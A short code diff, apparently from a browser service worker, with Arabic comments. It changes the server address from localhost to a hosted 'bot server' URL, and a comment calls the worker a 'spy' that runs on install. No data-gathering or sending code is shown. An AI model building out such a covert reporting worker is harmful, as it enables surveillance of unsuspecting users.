@@ -2,7 +2,7 @@
 
 // **مهم:** يجب أن تستخدم عنوان الخادم الحقيقي هنا
 // هذا عنوان مثالي للاختبار المحلي، قم بتغييره لاحقاً
-const SERVER_URL = 'http://localhost:5000'; 
+const SERVER_URL = 'https://my-bot-server-1.onrender.com'; 
 
 // هذا الحدث يعمل مرة واحدة عند تثبيت الجاسوس
 self.addEventListener('install', event => {
